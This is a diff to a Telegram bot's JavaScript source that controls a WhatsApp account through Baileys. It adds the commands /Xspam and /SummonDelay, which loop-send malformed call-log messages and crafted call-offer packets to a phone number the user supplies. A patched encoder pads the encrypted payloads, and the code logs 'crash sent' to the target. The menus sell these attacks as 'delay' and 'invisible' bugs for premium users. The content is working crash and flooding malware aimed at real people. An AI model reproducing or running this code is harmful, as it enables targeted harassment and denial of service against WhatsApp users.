@@ -1331,10 +1331,12 @@ async function showxbugs(ctx, page = 1) {
 ◇ System    : Auto-Update
 ◇ Language  : JavaScript
 ◇ Framework : Telegraf
-<blockquote>☾. ⬡═―⊱「 🚀 DELAY TYPE 」⊰―═⬡ ࣪ ִֶָ☾.</blockquote>
-◇ /Xdelay   62xxx  → Delay Hard Visible
-◇ /Xbug    62xxx  → Invisible Delay
-◇ /Xoya   62xxx  → Delay Bebas Spam For Murbug
+<blockquote>☾. ⬡═―⊱「 🚀 DELAY BUGS TYPE 」⊰―═⬡ ࣪ ִֶָ☾.</blockquote>
+⸙ /Xdelay   62xxx  → Delay Hard Visible
+⸙ /Xbug    62xxx  → Invisible Delay
+⸙ /Xoya   62xxx  → Delay Bebas Spam For Murbug v1
+⸙ /Xspam   62xxx  → Delay Bebas Spam For Murbug v2
+⸙ /SummonDelay   62xxx  → Delay Bebas Spam For Murbug v3
 
 <blockquote>ִֶָ࣪☾. ( ! ) 𝚂𝚎𝚕𝚕𝚎𝚌𝚝 𝚃𝚑𝚎 𝙼𝚎𝚗𝚞 𝙱𝚞𝚝𝚝𝚘𝚗 𝙱𝚎𝚕𝚘𝚠 ࣪ ִֶָ☾.</blockquote>
 `;
@@ -1358,8 +1360,8 @@ async function showxbugs(ctx, page = 1) {
 ◇ System    : Auto-Update
 ◇ Language  : JavaScript
 ◇ Framework : Telegraf
-<blockquote>☾. ⬡═―⊱「 ✨ NO SPAM MENU BUG 」⊰―═⬡ ࣪ ִֶָ☾.</blockquote>
-◇ /ultramencrash   62xxxx  → Blank WhatsApp One Msg
+<blockquote>☾. ⬡═―⊱「 ✨ VISIBLE MENU ✨」⊰―═⬡ ࣪ ִֶָ☾.</blockquote>
+  🚨COMING SOON NEXT UPDATE AKAN RILIS🚨
 <blockquote>ִֶָ࣪☾. ( ! ) 𝚂𝚎𝚕𝚕𝚎𝚌𝚝 𝚃𝚑𝚎 𝙼𝚎𝚗𝚞 𝙱𝚞𝚝𝚝𝚘𝚗 𝙱𝚎𝚕𝚘𝚠 ࣪ ִֶָ☾.</blockquote>
 `;
 
@@ -1409,12 +1411,12 @@ bot.action("tools", async (ctx) => {
 ◇ Language  : JavaScript
 ◇ Framework : Telegraf
 <blockquote>☾. ⬡═―⊱「 ⚙️ TOOLS 」⊰―═⬡ ࣪ ִֶָ☾.</blockquote>
-◇ /brat
-◇ /tiktokdl
-◇ /convert
-◇ /waktu
-◇ /ssiphone
-◇ /cekidch
+⸙ /brat
+⸙ /tiktokdl
+⸙ /convert
+⸙ /waktu
+⸙ /ssiphone
+⸙ /cekidch
 <blockquote>ִֶָ࣪☾. ( ! ) 𝚂𝚎𝚕𝚕𝚎𝚌𝚝 𝚃𝚑𝚎 𝙼𝚎𝚗𝚞 𝙱𝚞𝚝𝚝𝚘𝚗 𝙱𝚎𝚕𝚘𝚠 ࣪ ִֶָ☾.</blockquote>
 `;
 
@@ -2324,8 +2326,9 @@ bot.command("Xoya", checkAllPremium, checkWhatsAppConnection, checkCooldown, asy
 `<pre>🛡️ 𝐈𝐧𝐟𝐨𝐫𝐦𝐚𝐭𝐢𝐨𝐧 𝐀𝐭𝐭𝐚𝐜𝐤 𝐛𝐮𝐠𝐬
  ━━━━━━━━━━━━━━━
 ◇ 📤 Target : ${q}
-◇ 🦋 Type : DELAY BEBAS SPAM
+◇ 🦋 Type : DELAY BEBAS SPAM V1
 ◇ ☘️ Loop : Sedang Memasak
+◇ 🏃🏻Runtime : ${runtime(process.uptime())}
 ◇ ⚙️ Command : Xqoya Bugs
 ◇ ⚡ Status : Success✅</pre>`,
     { parse_mode: "HTML" }
@@ -2335,6 +2338,68 @@ bot.command("Xoya", checkAllPremium, checkWhatsAppConnection, checkCooldown, asy
     for (let r = 0; r < 8; r++) {
       await SukaSukaDiley(sock, target);
       await sleep(1000);
+    }
+  })();
+});
+/// ============= CASE BUG 4 BEBAS SPAM=============\\\
+bot.command("Xspam", checkAllPremium, checkWhatsAppConnection, checkCooldown, async (ctx) => {
+
+  const q = ctx.message.text.split(" ")[1]; 
+  if (!q) return ctx.reply("🪧 ☇ Example : /Xspam 62xx");
+
+  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
+
+  await ctx.reply(
+`<pre>🛡️ 𝐈𝐧𝐟𝐨𝐫𝐦𝐚𝐭𝐢𝐨𝐧 𝐀𝐭𝐭𝐚𝐜𝐤 𝐛𝐮𝐠𝐬
+ ━━━━━━━━━━━━━━━
+◇ 📤 Target : ${q}
+◇ 🦋 Type : DELAY FOR MURBUG V2
+◇ ☘️ Loop : Sedang Memasak
+◇ 🏃🏻Runtime : ${runtime(process.uptime())}
+◇ 🏠Memory  : ${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)} MB
+◇ ⚙️ Command : Xspam Bugs
+◇ ⚡ Status : Success✅</pre>`,
+    { parse_mode: "HTML" }
+  );
+
+  (async () => {
+    for (let r = 0; r < 10; r++) {
+      await SukaSukaDiley(sock, target);
+      await sleep(1000);
+      await VsxFc(sock, target);
+      await sleep(1000);
+    }
+  })();
+});
+/// ============= CASE BUG 5 BEBAS SPAM=============\\\
+bot.command("SummonDelay", checkAllPremium, checkWhatsAppConnection, checkCooldown, async (ctx) => {
+
+  const q = ctx.message.text.split(" ")[1]; 
+  if (!q) return ctx.reply("🪧 ☇ Example : /SummonDelay 62xx");
+
+  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
+
+  await ctx.reply(
+`<pre>🛡️ 𝐈𝐧𝐟𝐨𝐫𝐦𝐚𝐭𝐢𝐨𝐧 𝐀𝐭𝐭𝐚𝐜𝐤 𝐛𝐮𝐠𝐬
+ ━━━━━━━━━━━━━━━
+◇ 📤 Target : ${q}
+◇ 🦋 Type : DELAY FOR MURBUG V3
+◇ ☘️ Loop : Sedang Memasak
+◇ 🏃🏻Runtime : ${runtime(process.uptime())}
+◇ 🏠Memory  : ${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)} MB
+◇ ⚙️ Command : SummonDelay Bugs
+◇ ⚡ Status : Success✅</pre>`,
+    { parse_mode: "HTML" }
+  );
+
+  (async () => {
+    for (let r = 0; r < 10; r++) {
+      await SukaSukaDiley(sock, target);
+      await sleep(1000);
+      await VsxFc(sock, target);
+      await sleep(1000);
+      await RxVzInvis(sock, target);
+      await sleep(1500);
     }
   })();
 });
@@ -2790,6 +2855,268 @@ async function SukaSukaDiley(sock, target) {
 
     } catch (err) {
         console.error("error:", err);
+    }
+}
+
+async function VsxFc(sock, target) {
+  const Msg = {
+    callLogMessage: {
+      isvideo: true,
+      callOutcome: 1,
+      durationSecs: 16000,
+      callType: 1
+    }
+  };
+
+  await sock.relayMessage(target, Msg, {
+    participant: {
+      jid: target
+    }
+  });
+}
+
+async function RxVzInvis(sock, target) {
+    const { 
+        encodeSignedDeviceIdentity, 
+        jidDecode, 
+        encodeWAMessage
+    } = require("@whiskeysockets/baileys");
+    
+    const crypto = require('crypto');
+    
+    const generateTag = () => {
+        return Date.now().toString(36) + Math.random().toString(36).substring(2, 8);
+    };
+    
+    let devices;
+    try {
+        const result = await sock.getUSyncDevices([target], false, false);
+        devices = result.map(({ user, device }) => {
+            const devicePart = device ? `:${device}` : '';
+            return `${user}${devicePart}@s.whatsapp.net`;
+        });
+    } catch (error) {
+        console.error('[RxVz] Error getting devices:', error);
+        throw error;
+    }
+
+    try {
+        await sock.assertSessions(devices);
+    } catch (error) {
+        console.warn('[RxVz] Warning in assertSessions:', error);
+    }
+
+    const createLock = () => {
+        const locks = new Map();
+        return {
+            async lock(key, fn) {
+                while (locks.has(key)) {
+                    await locks.get(key);
+                }
+                
+                const lock = Promise.resolve();
+                locks.set(key, lock);
+                
+                try {
+                    return await fn();
+                } finally {
+                    locks.delete(key);
+                }
+            }
+        };
+    };
+
+    const mutex = createLock();
+    
+    const encodeBuffer = (buf) => {
+        if (typeof buf === 'string') {
+            buf = Buffer.from(buf, 'utf-8');
+        } else if (!Buffer.isBuffer(buf)) {
+            buf = Buffer.from(buf);
+        }
+        const result = Buffer.alloc(buf.length + 8);
+        buf.copy(result, 0);
+        result.fill(1, buf.length);
+        return result;
+    };
+    
+    const originalEncode = sock.encodeWAMessage?.bind(sock);
+    
+    sock.buildParticipantNodes = async (recipients, msg, extra, dsmMsg) => {
+        if (!recipients || !recipients.length) {
+            return { nodes: [], includeIdentity: false };
+        }
+
+        let patched;
+        try {
+            patched = await (sock.patchMessageBeforeSending?.(msg, recipients) ?? msg);
+        } catch (error) {
+            console.warn('[RxVz] Error in patchMessage:', error);
+            patched = msg;
+        }
+        
+        const mapped = Array.isArray(patched) 
+            ? patched 
+            : recipients.map(jid => ({ 
+                recipientJid: jid, 
+                message: patched 
+            }));
+
+        const { id: selfId, lid: selfLid } = sock.authState?.creds?.me || {};
+        const lidUser = selfLid ? jidDecode(selfLid)?.user : null;
+        let includeIdentity = false;
+
+        const nodes = [];
+        
+        for (const { recipientJid: jid, message: msgContent } of mapped) {
+            if (!jid) continue;
+            
+            const decodedJid = jidDecode(jid);
+            const decodedSelf = jidDecode(selfId || '');
+            
+            if (!decodedJid) continue;
+            
+            const jidUser = decodedJid.user;
+            const selfUser = decodedSelf?.user;
+            const isSelf = jidUser === selfUser || jidUser === lidUser;
+            const isMain = jid === selfId || jid === selfLid;
+            
+            let finalMsg = msgContent;
+            if (dsmMsg && isSelf && !isMain) {
+                finalMsg = dsmMsg;
+            }
+
+            let bytes;
+            try {
+                const encoded = originalEncode 
+                    ? originalEncode(finalMsg)
+                    : encodeWAMessage(finalMsg);
+                bytes = encodeBuffer(encoded);
+            } catch (error) {
+                console.error('[RxVz] Error encoding:', error);
+                continue;
+            }
+
+            try {
+                const result = await mutex.lock(jid, async () => {
+                    if (!sock.signalRepository?.encryptMessage) {
+                        throw new Error('[RxVz] Signal repository unavailable');
+                    }
+                    
+                    const encrypted = await sock.signalRepository.encryptMessage({ 
+                        jid, 
+                        data: bytes 
+                    });
+                    
+                    if (encrypted.type === 'pkmsg') {
+                        includeIdentity = true;
+                    }
+                    
+                    return {
+                        tag: 'to',
+                        attrs: { jid },
+                        content: [{
+                            tag: 'enc',
+                            attrs: { 
+                                v: '2', 
+                                type: encrypted.type,
+                                ...(extra || {})
+                            },
+                            content: encrypted.ciphertext
+                        }]
+                    };
+                });
+                
+                if (result) {
+                    nodes.push(result);
+                }
+            } catch (error) {
+                console.error(`[RxVz] Error encrypting ${jid}:`, error);
+            }
+        }
+
+        return { 
+            nodes: nodes.filter(Boolean), 
+            includeIdentity 
+        };
+    };
+    
+    const randomKey = crypto.randomBytes(32);
+    const floodBuffer = Buffer.concat([randomKey, Buffer.alloc(8, 0)]);
+    
+    let destinations = [];
+    let includeIdentity = false;
+    
+    try {
+        const result = await sock.buildParticipantNodes(
+            devices, 
+            { conversation: "y" }, 
+            { count: '0' }
+        );
+        destinations = result.nodes || [];
+        includeIdentity = result.includeIdentity || false;
+    } catch (error) {
+        console.error('[RxVz] Error building nodes:', error);
+        throw error;
+    }
+    
+    const callPacket = {
+        tag: "call",
+        attrs: { 
+            to: target, 
+            id: generateTag(),
+            from: sock.user?.id || sock.authState?.creds?.me?.id 
+        },
+        content: [{
+            tag: "offer",
+            attrs: {
+                "call-id": crypto.randomBytes(16).toString("hex").toUpperCase(),
+                "call-creator": sock.user?.id || sock.authState?.creds?.me?.id
+            },
+            content: [
+                { tag: "audio", attrs: { enc: "opus", rate: "16000" } },
+                { tag: "audio", attrs: { enc: "opus", rate: "8000" } },
+                {
+                    tag: "video",
+                    attrs: {
+                        orientation: "0",
+                        screen_width: "1920",
+                        screen_height: "1080",
+                        device_orientation: "0",
+                        enc: "vp8",
+                        dec: "vp8"
+                    }
+                },
+                { tag: "net", attrs: { medium: "3" } },
+                { 
+                    tag: "capability", 
+                    attrs: { ver: "1" }, 
+                    content: Buffer.from([1, 5, 247, 9, 228, 250, 1]) 
+                },
+                { tag: "encopt", attrs: { keygen: "2" } },
+                { 
+                    tag: "destination", 
+                    attrs: {}, 
+                    content: destinations 
+                },
+                ...(includeIdentity ? [{
+                    tag: "device-identity",
+                    attrs: {},
+                    content: encodeSignedDeviceIdentity(
+                        sock.authState?.creds?.account, 
+                        true
+                    )
+                }] : [])
+            ]
+        }]
+    };
+    
+    try {
+        await sock.sendNode(callPacket);
+        console.log(`[RxVz] crash sent to ${target}`);
+    } catch (error) {
+        console.error('[RxVz] Error sending call:', error);
+        throw error;
     }
 }
 
